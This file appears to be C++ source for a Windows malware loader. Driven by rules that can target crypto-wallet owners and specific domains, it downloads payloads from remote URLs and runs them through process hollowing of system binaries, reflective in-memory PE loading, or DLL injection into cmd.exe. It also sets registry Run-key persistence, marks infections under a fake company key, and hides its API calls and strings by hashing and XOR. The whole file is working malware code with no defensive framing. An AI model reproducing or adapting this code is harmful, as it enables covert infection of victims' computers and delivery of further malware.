#include "Loader.h"
#include "Hash.h"

void __stdcall runLoadPE(LPVOID ep)
{
	try
	{
		if (ep != nullptr)
			__asm call ep
	}
	catch (...) { return; }
}

bool Loader::findEntry(const vector<string> & src, const string & what)
{
	try
	{
		for (size_t i = 0; i < src.size(); ++i)
		{
			if (stringCompare(src[i], what) >= 0.8f)
				return true;
		}

		return false;
	}
	catch (...) { return false; }
}

bool Loader::findEntry(const vector<unsigned int> & src, unsigned int what)
{
	try
	{
		for (size_t i = 0; i < src.size(); ++i)
		{
			if (src[i] == what)
				return true;
		}

		return false;
	}
	catch (...) { return false; }
}

string Loader::random_string(const size_t size)
{
	try
	{
		string res = "";
		for (size_t i = 0; i < size; ++i)
		{
			int rnd = 'a' + rand() % 'z';
			while (rnd > 'z')
				rnd = 'a' + rnd % 'z';
			res += (char)rnd;
		}

		return res;
	}
	catch (...) { return ""; }
}

void Loader::RunPE(void * Image, const string & path, const string & args)
{
	try
	{
		IMAGE_DOS_HEADER* DOSHeader = PIMAGE_DOS_HEADER(Image);
		IMAGE_NT_HEADERS* NtHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader->e_lfanew);

		if (NtHeader->Signature == IMAGE_NT_SIGNATURE)
		{
			PROCESS_INFORMATION PI;
			STARTUPINFOA SI;

			ZeroMemory(&PI, sizeof(PI));
			ZeroMemory(&SI, sizeof(SI));

			if (FNC(CreateProcessA, XOR("Kernel32.dll"))(path.c_str(), (LPSTR)(args.empty() ? NULL : args.c_str()), NULL, NULL, FALSE,
				CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
			{
				CONTEXT* CTX = LPCONTEXT(FNC(VirtualAlloc, XOR("Kernel32.dll"))(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
				CTX->ContextFlags = CONTEXT_FULL;

				if (FNC(GetThreadContext, XOR("Kernel32.dll"))(PI.hThread, LPCONTEXT(CTX)))
				{
					DWORD* ImageBase;
					if (!FNC(ReadProcessMemory, XOR("Kernel32.dll"))(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0))
						return;
					void* pImageBase = FNC(VirtualAllocEx, XOR("Kernel32.dll"))(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
						NtHeader->OptionalHeader.SizeOfImage, XorInt(0x3000), PAGE_EXECUTE_READWRITE);
					if (!pImageBase)
						return;
					if (!FNC(WriteProcessMemory, XOR("Kernel32.dll"))
						(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL))
						return;

					IMAGE_SECTION_HEADER* SectionHeader;
					for (int count = 0; count < NtHeader->FileHeader.NumberOfSections; ++count)
					{
						SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));
						if (!FNC(WriteProcessMemory, XOR("Kernel32.dll"))(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
							LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0))
							return;
					}
					if (!FNC(WriteProcessMemory, XOR("Kernel32.dll"))
						(PI.hProcess, LPVOID(CTX->Ebx + 8), LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0))
						return;

					CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
					FNC(SetThreadContext, XOR("Kernel32.dll"))(PI.hThread, LPCONTEXT(CTX));
					FNC(ResumeThread, XOR("Kernel32.dll"))(PI.hThread);
				}
			}
		}
	}
	catch (...) { return; }
}

void Loader::DownloadFile(const string & site, string & file)
{
	try
	{
		FNC(CoInitialize, XOR("Ole32.dll"))(NULL);
		IStream* pStream = nullptr;
		FNC(URLOpenBlockingStreamA, XOR("Urlmon.dll"))(0, site.c_str(), &pStream, 0, 0);

		while (pStream != nullptr)
		{
			DWORD dwGot = 0;
			char szBuffer[200] = "";

			if (pStream->Read(szBuffer, sizeof(szBuffer) - 1, &dwGot) != S_OK)
				break;

			file += string(szBuffer, dwGot);
		};

		if (pStream != nullptr)
			pStream->Release();
	}
	catch (...) { return; }
}

float Loader::stringCompare(const string & str1, const string & str2)
{
	try
	{		
		float eq = 0.0f;
		size_t min = str1.size() > str2.size() ? str2.size() : str1.size();

		if (min == 0)
			return 1.0f;

		for (size_t i = 0; i < min; ++i)
		{
			char ch1 = str1[i], ch2 = str2[i];

			if (ch1 >= 'A' && ch1 <= 'Z')
				ch1 += XorInt(32);
			if (ch2 >= 'A' && ch2 <= 'Z')
				ch2 += XorInt(32);

			if (ch1 == ch2)
				eq += 1.0f;
		}

		return eq / min;
	}
	catch (...) { return 1.0f; }
}

void * Loader::LoadPE(void * pData)
{
	try
	{
		PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pData;
		// Вроде бы файл скачивается полностью корренкто, но все равно головная ебола
		//if (pDos->e_magic != IMAGE_DOS_SIGNATURE || (pDos->e_lfanew % sizeof(DWORD)) != 0)
			//return NULL;
		PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((DWORD)pData + pDos->e_lfanew);
		if (pNt->Signature != IMAGE_NT_SIGNATURE)
			return NULL;
		PIMAGE_OPTIONAL_HEADER pOpt = &pNt->OptionalHeader;
		PIMAGE_DATA_DIRECTORY pRelEntry = &pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
		if (!pOpt->AddressOfEntryPoint || !pRelEntry->VirtualAddress)
			return NULL;
		LPVOID pBase = FNC(VirtualAlloc, XOR("Kernel32.dll"))(NULL, pOpt->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (!pBase)
			return NULL;
		PIMAGE_SECTION_HEADER pSections = IMAGE_FIRST_SECTION(pNt);
		// Копируем все секции файла в выделенную память
		_memcpy(pBase, pData, pOpt->SizeOfHeaders);
		for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; ++i)
			_memcpy((BYTE*)pBase + pSections[i].VirtualAddress, (BYTE*)pData + pSections[i].PointerToRawData, pSections[i].SizeOfRawData);
		if (pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size)
		{
			// Импортируем все модули и функции для файла
			PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)
				((DWORD)pBase + pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
			while (pImport->Name)
			{
				LPSTR szMod = (LPSTR)((DWORD)pBase + pImport->Name);
				HMODULE hDll = LoadLibraryA(szMod);
				if (hDll)
				{
					PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((DWORD)pBase + pImport->OriginalFirstThunk);
					PIMAGE_THUNK_DATA pFunc = (PIMAGE_THUNK_DATA)((DWORD)pBase + pImport->FirstThunk);
					if (!pImport->OriginalFirstThunk)
						pThunk = pFunc;
					for (; pThunk->u1.AddressOfData; ++pFunc, ++pThunk)
					{
						char *funcName;
						if (pThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)
							funcName = (char*)(pThunk->u1.Ordinal & 0xFFFF);
						else
							funcName = (char*)((PIMAGE_IMPORT_BY_NAME)((char*)pBase + pThunk->u1.AddressOfData))->Name;
						pFunc->u1.Function = (DWORD)get_proc_address(hDll, funcName);
					}
				}
				++pImport;
			}
		}

		// Если включен ебучий ASLR, то нужно хуярить релокации
		PIMAGE_BASE_RELOCATION pBaseReloc = (PIMAGE_BASE_RELOCATION)((DWORD)pBase + pRelEntry->VirtualAddress);
		PIMAGE_BASE_RELOCATION curReloc = pBaseReloc;
		DWORD relOffset = (DWORD)pBase - pOpt->ImageBase;
		PIMAGE_BASE_RELOCATION relocEnd = (PIMAGE_BASE_RELOCATION)((DWORD)pBaseReloc + pRelEntry->Size);
		while (curReloc < relocEnd && curReloc->VirtualAddress)
		{
			DWORD count = (curReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
			PWORD curEntry = (PWORD)(curReloc + 1);
			DWORD pageVA = (DWORD)pBase + curReloc->VirtualAddress;
			for (; count; ++curEntry, --count)
				if ((*curEntry >> 12) == IMAGE_REL_BASED_HIGHLOW)
					*(DWORD*)((char *)pageVA + (*curEntry & 0x0fff)) += relOffset;
			curReloc = (PIMAGE_BASE_RELOCATION)((DWORD)curReloc + curReloc->SizeOfBlock);
		}

		// Оригинальные аттрибуты секций (R,W,RW и т.п)
		DWORD_PTR dwProtect;
		FNC(VirtualProtect, XOR("Kernel32.dll"))(pBase, pNt->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &dwProtect);
		for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; ++i)
		{
			void* section = (BYTE*)pBase + pSections[i].VirtualAddress;
			DWORD_PTR secp = pSections[i].Characteristics;
			DWORD_PTR vmemp = secp2vmemp[!!(secp & IMAGE_SCN_MEM_EXECUTE)][!!(secp & IMAGE_SCN_MEM_READ)][!!(secp & IMAGE_SCN_MEM_WRITE)];
			if (secp & IMAGE_SCN_MEM_NOT_CACHED)
				vmemp |= PAGE_NOCACHE;
			FNC(VirtualProtect, XOR("Kernel32.dll"))(section, pSections[i].Misc.VirtualSize, vmemp, &dwProtect);
		}

		// TLS callbacks
		if (pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size)
		{
			PIMAGE_TLS_DIRECTORY pTls = (PIMAGE_TLS_DIRECTORY)
				((DWORD_PTR)pBase + pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
			PIMAGE_TLS_CALLBACK* pCallback = (PIMAGE_TLS_CALLBACK*)pTls->AddressOfCallBacks;
			for (; pCallback && *pCallback; ++pCallback)
				(*pCallback)(pBase, DLL_PROCESS_ATTACH, 0);
		}
		return (LPVOID)((DWORD_PTR)pBase + pOpt->AddressOfEntryPoint);
	}
	catch (...) { return nullptr; }
}

void Loader::_memcpy(void * dst, const void * src, size_t size)
{
	try
	{
		BYTE* _dst = (BYTE*)dst;
		BYTE* _src = (BYTE*)src;
		while (size--) *_dst++ = *_src++;
	}
	catch (...) { return; }
}

void Loader::processDomains(vector<LoaderRule> & rules, const vector<unsigned int> & hashes)
{
	try
	{
		for (LoaderRule & rule : rules)
		{
			if (!rule.onlyDomains.empty())
			{
				vector<unsigned int> hash;
				for (size_t i = 0; i < rule.onlyDomains.size(); ++i)
					if (!rule.onlyDomains[i].empty())
						hash.push_back(crc32_hash(rule.onlyDomains[i]));
				bool found = false;
				for (size_t i = 0; i < hashes.size() && !found; ++i)
				{
					if (findEntry(hash, hashes[i]))
						found = true;
				}
				rule.active = found;
			}
		}
	}
	catch (...) { return; }
}

void Loader::execute(const vector<LoaderRule> & rules, bool cryptoWallet, vector<LoadedFileState> & threads)
{
	try
	{
		BOOL is64proc;
		FNC(IsWow64Process, XorStr("Kernel32.dll"))((HANDLE)-1/*FNC(GetCurrentProcess, XorStr("Kernel32.dll"))()*/, &is64proc);
		bool repeat = false;
		char* advapi32 = XOR("advapi32.dll");

		for (size_t i = 0; i < rules.size(); ++i)
		{
			LoaderRule rule = rules[i];
			if (rule.active)
			{
				if (rule.cryptoOnly && !cryptoWallet)
					continue;
				if (rule.systemType != SystemType::loader_Both && rule.systemType != SystemType::loader_Trash)
				{
					SystemType type = is64proc ? SystemType::loader_X64 : SystemType::loader_X32;
					if (rule.systemType != type)
						continue;
				}
				
				if (rule.repeat)
				{
					HKEY hKey;
					if (FNC(RegOpenKeyA, advapi32)(HKEY_CURRENT_USER, XOR("Software"), &hKey) == ERROR_SUCCESS)
					{
						HKEY hNew1, hNew2;
						if (!repeat)
						{
							if (FNC(RegOpenKeyA, advapi32)(hKey, XOR("AdviceService Ltd."), &hNew1) == ERROR_SUCCESS)
							{
								if (FNC(RegOpenKeyA, advapi32)(hKey,
									(XOR("AdviceService Ltd.\\") + std::to_string(rule.id)).c_str(), &hNew1) == ERROR_SUCCESS)
								{
									FNC(RegCloseKey, advapi32)(hKey);
									FNC(RegCloseKey, advapi32)(hNew1);
									continue;
								}
							}
							else
							{
								repeat = true;
								FNC(RegCreateKeyA, advapi32)(hKey, XOR("AdviceService Ltd."), &hNew2);
							}
						}

						FNC(RegCreateKeyA, advapi32)(hKey, (XOR("AdviceService Ltd.\\") + std::to_string(rule.id)).c_str(),
							&hNew2);
						FNC(RegCloseKey, advapi32)(hNew2);
						FNC(RegCloseKey, advapi32)(hKey);
						FNC(RegCloseKey, advapi32)(hNew1);
					}
				}

				if (rule.launchType == LaunchType::loader_RunPE || rule.launchType == LaunchType::loader_LoadPE)
				{
					string file = "";
					DownloadFile(rule.url, file);
					
					if (rule.launchType == LaunchType::loader_RunPE)
					{
						const char* p = getenv(XOR("windir"));
						if (p == nullptr)
							continue;
						const string dir = (string)p;
						const string pathes[3] =
						{
							dir + XOR("\\System32\\attrib.exe"),
							dir + XOR("\\System32\\cmd.exe"),
							dir + XOR("\\System32\\audiodg.exe")
						};
						RunPE((LPVOID)file.c_str(), pathes[rule.launchOption - 1], rule.args);
					}
					else if (rule.launchType == LaunchType::loader_LoadPE)
					{
						void* ep = LoadPE((LPVOID)file.c_str());
						threads.push_back({
							FNC(CreateThread, XOR("Kernel32.dll"))
							(0, 0, (LPTHREAD_START_ROUTINE)runLoadPE, (LPVOID)ep, 0, 0), false });
					}
					file.clear();
				}
				else if (rule.launchType == LaunchType::loader_ShellExecute || rule.launchType == LaunchType::loader_CreateProcess)
				{
					const string key_file = rule.randomName ? ('{' + random_string(8) + '}') : (rule.url.substr(rule.url.rfind('/') + 1));

					string addition = '\\' + key_file;
					if (rule.randomName)
						addition += XOR(".exe");
					
					const string pathes[3] =
					{
						(string)getenv(XOR("programdata")) + addition,
						(string)getenv(XOR("temp")) + addition,
						(string)getenv(XOR("appdata")) + addition
					};

					FNC(URLDownloadToFileA, XOR("Urlmon.dll"))(0, rule.url.c_str(), pathes[rule.launchOption - 1].c_str(), 0, 0);
					if (rule.launchType == LaunchType::loader_CreateProcess)
					{
						PROCESS_INFORMATION PI;
						STARTUPINFOA SI;

						ZeroMemory(&PI, sizeof(PI));
						ZeroMemory(&SI, sizeof(SI));

						FNC(CreateProcessA, XOR("Kernel32.dll"))(pathes[rule.launchOption - 1].c_str(),
							(LPSTR)(rule.args.empty() ? NULL : rule.args.c_str()), 0, 0, FALSE, 0, 0, 0, &SI, &PI);
					}
					else if (rule.launchType == LaunchType::loader_ShellExecute)
					{
						FNC(ShellExecuteA, XOR("Shell32.dll"))(0, (rule.launchAsAdmin ? XOR("runas") : NULL), pathes[rule.launchOption - 1].c_str(),
							(rule.args.empty() ? NULL : rule.args.c_str()), 0, SW_HIDE);
					}

					if (rule.addAutoStart)
					{
						HKEY key;
						LONG status = FNC(RegCreateKeyA, advapi32)(HKEY_CURRENT_USER,
							XOR("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), &key);
						if (status == ERROR_SUCCESS)
						{
							FNC(RegSetValueExA, advapi32)(key, key_file.c_str(), 0, REG_SZ,
								(BYTE*)pathes[rule.launchOption - 1].c_str(), pathes[rule.launchOption - 1].size() + 1);
							FNC(RegCloseKey, advapi32)(key);
						}
					}
				}
				else if (rule.launchType == LaunchType::loader_LoadLibrary)
				{
					const string key_file = '{' + random_string(8) + '}';
					const string addition = '\\' + key_file + XOR(".dll");
					const string pathes[3] =
					{
						(string)getenv(XOR("programdata")) + addition,
						(string)getenv(XOR("temp")) + addition,
						(string)getenv(XOR("appdata")) + addition
					};

					FNC(URLDownloadToFileA, XOR("Urlmon.dll"))(0, rule.url.c_str(), pathes[rule.launchOption - 1].c_str(), 0, 0);

					PROCESS_INFORMATION PI;
					STARTUPINFOA SI;

					ZeroMemory(&PI, sizeof(PI));
					ZeroMemory(&SI, sizeof(SI));

					const char* p = getenv(XOR("windir"));
					if (p == nullptr)
						continue;
					const string dir = (string)p;

					if (FNC(CreateProcessA, XOR("Kernel32.dll"))((dir + XOR("\\System32\\cmd.exe")).c_str(), NULL,
						0, 0, FALSE, CREATE_NO_WINDOW, 0, 0, &SI, &PI))
					{
						HANDLE hProc = PI.hProcess;
						if (hProc != INVALID_HANDLE_VALUE)
						{
							LPVOID LoadLib = (LPVOID)get_proc_address(get_kernel32_handle(), XOR("LoadLibraryA"));
							if (LoadLib)
							{
								LPVOID RemoteString = FNC(VirtualAllocEx, XOR("Kernel32.dll"))
									(hProc, NULL, pathes[rule.launchOption - 1].size(), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
								if (RemoteString)
								{
									if (FNC(WriteProcessMemory, XOR("Kernel32.dll"))(hProc, RemoteString,
										pathes[rule.launchOption - 1].c_str(), pathes[rule.launchOption - 1].size(), NULL))
									{
										FNC(CreateRemoteThread, XOR("Kernel32.dll"))(hProc, NULL, NULL,
											(LPTHREAD_START_ROUTINE)LoadLib, (LPVOID)RemoteString, NULL, NULL);
									}
								}
							}
						}
					}
				}
			}
		}
	}
	catch (...) { return; }
}